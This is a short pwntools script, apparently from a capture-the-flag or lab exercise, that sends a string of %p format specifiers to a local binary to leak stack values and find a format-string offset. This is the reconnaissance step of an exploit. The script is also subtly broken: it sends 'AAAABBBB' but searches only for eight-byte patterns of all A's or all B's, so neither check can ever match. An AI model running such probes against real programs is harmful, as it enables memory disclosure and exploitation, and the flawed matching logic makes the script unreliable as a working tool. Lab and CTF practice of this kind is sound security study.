#!/usr/bin/env python3
from pwn import *

context.log_level = 'warn'

# Crear proceso
p = process('./vuln')
p.recvuntil(b'What do you have to say?\n')

# Usar patrón AAAABBBB seguido de %p para encontrar dónde aparecen
payload = b'AAAABBBB'
for i in range(1, 40):
    payload += f'|%{i}$p'.encode()

p.sendline(payload)
response = p.recvall(timeout=2).decode()
print(response)
p.close()

# Buscar 0x4141414141414141 (AAAAAAAA) en la salida
if '0x4141414141414141' in response:
    print("\nFound AAAAAAAA pattern!")
    parts = response.split('|')
    for i, part in enumerate(parts):
        if '0x4141414141414141' in part:
            print(f"Position: {i}")
elif '0x4242424242424242' in response:
    print("\nFound BBBBBBBB pattern!")
    parts = response.split('|')
    for i, part in enumerate(parts):
        if '0x4242424242424242' in part:
            print(f"Position: {i}")
